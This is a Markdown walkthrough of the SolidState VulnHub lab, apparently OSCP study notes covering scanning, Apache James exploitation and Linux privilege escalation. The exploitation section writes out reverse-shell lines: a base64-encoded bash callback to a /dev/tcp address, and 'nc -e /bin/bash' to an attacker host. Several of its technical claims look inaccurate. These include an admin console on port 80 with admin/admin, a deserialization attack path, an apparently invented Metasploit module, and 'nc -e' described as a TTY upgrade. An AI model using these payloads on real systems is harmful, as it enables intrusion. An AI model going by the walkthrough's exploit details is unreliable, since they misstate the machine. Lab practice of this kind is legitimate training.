# SolidState: OSCP Walkthrough Notes

> **Source:** [SolidState on VulnHub](https://www.vulnhub.com/entry/solidstate-1,109/)
> **Author:** D3f4ult
> **Difficulty:** Easy / Medium
> **OS:** Linux (Debian-based)
> **Goal:** Get root / find `root.txt`

---

## Table of Contents

1. [Recon](#1-recon)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Screenshots](#5-screenshots)
6. [Key Takeaways](#6-key-takeaways)

---

## M4d3 w1th ❤️ by Ankit Patidar

---

## 1. Recon

### Host Discovery

Start by discovering the target on the network.

```bash
netdiscover -i tun0
# or
arp-scan --localnet
```

Identify the target IP (typically on `192.168.x.0/24`).

### Port Scanning

Run a comprehensive Nmap scan with service detection and scripts:

```bash
nmap -sV -sC -p- -T4 <target_ip>
```

### Expected Open Ports

| Port | Service | Version |
|------|---------|---------|
| 25   | SMTP    | Apache James SMTP Server |
| 110  | POP3    | Apache James POP3 |
| 80   | HTTP    | Apache James Web Admin Console |
| 445  | SMB     | Samba (optional, vary by build) |

Apache James is the key attack surface: it runs a Java-based mail server on ports 25, 110, and 80.

---

## 2. Enumeration

### Web Console (Port 80)

- Browse to `http://<target_ip>/` and identify the Apache James admin console.
- The default web interface exposes administration for managing mail domains and users.
- Default credentials are known for older Apache James releases:
  - Username: `admin`
  - Password: `admin` (or blank on some versions)

### Apache James Version Detection

- Identify the exact Apache James version (e.g., 2.3.1 or 2.3.2).
- This version is **vulnerable to Remote Code Execution (RCE)** via a deserialization flaw in the admin console.

### SMTP/POP3 Enumeration

```bash
# SMTP Banner grab
nc -nv <target_ip> 25

# POP3 Banner grab
nc -nv <target_ip> 110
```

Enumerate valid user accounts if possible via RCPT TO commands or the web admin panel.

### Nmap Scripts

```bash
nmap -sV --script=smtp-enum-users,smb-enum-shares <target_ip>
```

---

## 3. Exploitation

### Apache James RCE

The core exploitation path leverages a **known RCE vulnerability** in Apache James (versions prior to the patched release).

#### Method: Java Deserialization / Admin Console RCE

1. Navigate to the Apache James web admin console at `http://<target_ip>/`.
2. Authenticate with default or discovered credentials.
3. The vulnerable admin console endpoint allows arbitrary command execution via crafted requests.
4. Use a known exploit or manually inject a command through the admin panel.

#### Common exploitation path:

The vulnerability exists in the JMX console/admin interface. A deserialization payload can trigger a reverse shell.

```bash
# Craft a reverse shell payload
# Use a tool like ysoserial if a Java deserialization chain is applicable:
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}" > payload.ser
```

#### Alternative: Known Metasploit Module

If a Metasploit module exists for the specific Apache James version:

```bash
use exploit/multi/misc/apache_james_jmx_console
set RHOSTS <target_ip>
set LHOST <attacker_ip>
set LPORT 4444
exploit
```

### Post-Exploitation: Initial Shell

Once a reverse shell is obtained:

```bash
# Upgrade to a TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
nc -e /bin/bash <attacker_ip> <lport>
```

Obtain a low-privilege shell as the user running the Apache James process (typically `nobody`, `daemon`, or `sshd`).

---

## 4. Privilege Escalation

### User Enumeration

```bash
whoami
id
cat /etc/passwd
```

Identify all users on the system.

### Linux PrivEsc Vectors

Common escalation paths in SolidState include:

1. **SUID Binaries**
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Writable Files in Sensitive Paths**
   ```bash
   find / -writable -type f 2>/dev/null
   find / -writable -type d 2>/dev/null
   ```

3. **Cron Jobs**
   ```bash
   cat /etc/crontab
   ls -la /etc/cron.d/
   find / -name "*.sh" -writable 2>/dev/null
   ```

4. **Password Files and Scripts**
   ```bash
   cat /home/*/.* 2>/dev/null
   find /home -type f -name "*.txt" -o -name "*.sh" 2>/dev/null
   ```

5. **Sudo Permissions**
   ```bash
   sudo -l
   ```

6. **Kernel Exploit** (if kernel version is old)
   ```bash
   uname -a
   ```
   Check for applicable local privilege escalation exploits based on the kernel version.

### Key Escalation Technique

The machine provides **12+ ways of privilege escalation**. Common paths:

- SUID bit on a misconfigured binary that can be exploited.
- A writable script in a cron directory that runs as root.
- A password file (e.g., in a home directory) leading to SSH or sudo access.
- Misconfigured sudo allowing command execution as root without password.

### Gaining Root

Once a root escalation vector is found and exploited:

```bash
# Example: exploit a SUID binary or sudo misconfiguration
sudo -l  # if allowed without password
# or
# exploit a SUID binary
<exploit_path>
```

Read the root flag:

```bash
cat /root/root.txt
```

---

## 5. Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap scan output (ports 25, 110, 80) | *[Image: Nmap Scan]* |
| Apache James web admin console | *[Image: Apache James]* |
| Admin console login page | *[Image: Admin Console]* |
| RCE / reverse shell connection | *[Image: RCE Shell]* |
| SUID binary enumeration | *[Image: SUID Enum]* |
| Privilege escalation step | *[Image: Privesc]* |
| Root shell with root.txt | *[Image: Root Flag]* |

---

## 6. Key Takeaways

1. **Apache James is a high-value target.** Older versions (pre-2.3.x patched releases) contain RCE vulnerabilities in the admin console. Always patch and restrict access to mail server admin interfaces.

2. **Default credentials are a real risk.** Apache James shipping with default `admin/admin` credentials in a deployed environment is a common misconfiguration.

3. **Java deserialization chains are powerful.** Tools like ysoserial can chain common Java libraries into RCE payloads against vulnerable Java applications.

4. **Linux privilege escalation requires thorough enumeration.** The SUID bit, writable files, cron jobs, and sudo configuration are the primary vectors. Systematic enumeration with `find` and `sudo -l` is essential.

5. **Multiple escalation paths exist.** SolidState teaches the value of persistence in enumeration: if one privilege escalation path fails, another likely exists.

6. **Netcat / reverse shells are the first step.** Always prepare a listener before exploitation. Upgrade to a TTY shell for full interaction.

---

## M4d3 w1th ❤️ by Ankit Patidar
